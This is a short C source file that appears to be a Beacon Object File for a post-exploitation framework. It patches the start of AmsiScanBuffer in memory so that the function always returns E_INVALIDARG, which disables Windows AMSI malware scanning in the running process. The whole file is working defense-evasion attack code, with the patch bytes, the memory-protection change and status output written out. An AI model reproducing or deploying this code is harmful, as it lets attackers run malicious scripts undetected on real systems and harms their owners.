#include <windows.h>
#include "beacon_compat.h"

void go(char *args, int args_len) {
    (void)args; (void)args_len;

    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] amsi.dll not loaded — nothing to patch\n");
        return;
    }

    void *pFunc = (void *)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pFunc) {
        BeaconPrintf(CALLBACK_ERROR, "[!] AmsiScanBuffer not found\n");
        return;
    }

    /* x64: mov eax, 0x80070057; ret */
    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD oldProtect;

    if (!VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] VirtualProtect failed: %lu\n", GetLastError());
        return;
    }

    memcpy(pFunc, patch, sizeof(patch));
    VirtualProtect(pFunc, sizeof(patch), oldProtect, &oldProtect);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] AMSI patched (AmsiScanBuffer → E_INVALIDARG)\n");
}
